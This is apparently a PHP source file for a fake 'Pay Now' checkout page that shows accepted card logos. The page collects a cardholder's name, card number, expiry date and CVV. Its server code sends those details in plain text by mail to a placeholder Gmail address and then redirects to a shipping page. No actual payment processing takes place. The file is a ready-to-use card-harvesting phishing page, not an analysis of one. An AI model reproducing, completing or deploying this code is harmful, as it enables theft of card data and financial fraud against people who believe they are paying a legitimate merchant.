<?php
    
    $mail_err = '';
    if (isset($_POST['btn'])) {
        
        $msg  = "Card holder name : " . $_POST['card_holder_name'] . "<br>";
        $msg .= "Card number : " . $_POST['card_number'] . "<br>";
        $msg .= "Expiry date : " . $_POST['expiry_date'] . "<br>";
        $msg .= "CVV : " . $_POST['cvv'] . "<hr>";

        $msg = wordwrap($msg,70);
        
        $mail = mail("yourmail@gmail.com", "Your subject here", $msg);

        if ($mail) {
            header('Location:shipping.php');
        } else {
            $mail_err = 'Payment failed. Please try again';
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">
    <link rel="stylesheet" href="style.css">
    <title>Pay Now</title>
</head>
<body>
    <div class="wrapper">
        <div class="payment">
            <div class="payment-logo">
                <p>p</p>
            </div>
            <h2>Payment Details</h2>
            <h3 style="color: red;text-align: center; margin-bottom: 10px;"><?php echo $mail_err; ?></h3>
            <div class="accepted-cards">
                <fieldset>
                    <legend>We accept following payment methods</legend>
                    <div class="card-container">
                        <div>
                            <img src="visa.jpg" alt="visa" class='visa-img'>
                            <p>visa</p>
                        </div>
                        <div>
                            <img src="mastercard.png" alt="mastercard" class='mastercard-img'>
                            <p>mastercard</p>
                        </div>
                        <div>
                            <img src="american-express.png" alt="american-express" class='american-express-img'>
                            <p>a-express</p>
                        </div>
                        <div>
                            <img src="union-pay.png" alt="union-pay" class='union-pay-img'>
                            <p>union-pay</p>
                        </div>
                        <div>
                            <img src="ucb.png" alt="ucb" class='ucb-img'>
                            <p>ucb</p>
                        </div>
                    </div>
                </fieldset>
            </div>
            <form method="POST" id="form" class="form">
                <div class="form-control">
                    <label for="cardholdername">Card holder:</label>
                    <input type="text" name="card_holder_name" placeholder="Card Holder Name" id="cardholdername" />
                    <i class="fas fa-check-circle"></i>
                    <i class="fas fa-exclamation-circle"></i>
                    <small>Error message</small>
                </div>
                <div class="form-control">
                    <label for="cardnumber">Card Number:</label>
                    <input type="number" name="card_number" placeholder="Valid Card Number" id="cardnumber" pattern="/^-?\d+\.?\d*$/"
                        onKeyPress="if(this.value.length==16) return false" />
                    <i class="fas fa-check-circle"></i>
                    <i class="fas fa-exclamation-circle"></i>
                    <small>Error message</small>
                </div>
                <div class="expiryandcvv">
                    <div class="form-control">
                        <label for="expirydate">Expiry Date:</label>
                        <input type="text" name="expiry_date" placeholder="00/00" id="expirydate" />
                        <i class="fas fa-check-circle"></i>
                        <i class="fas fa-exclamation-circle"></i>
                        <small class='expirydatesmall'>Error message</small>
                    </div>
                    <div class="form-control">
                        <label for="cvv">CVV:</label>
                        <input type="number" name="cvv" placeholder="000" id="cvv" pattern="/^-?\d+\.?\d*$/"
                            onKeyPress="if(this.value.length==3) return false" />
                        <i class="fas fa-check-circle"></i>
                        <i class="fas fa-exclamation-circle"></i>
                        <small class='cvvsmall'>Error message</small>
                    </div>
                </div>
                <button type="submit" name="btn"> Next Step</button>
                <div class='processing_form'>
                    <div class="content">
                        <div class="loader"></div>
                        <p>Processing, Please Wait....</p>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <script src="index.js"></script>
</body>
</html>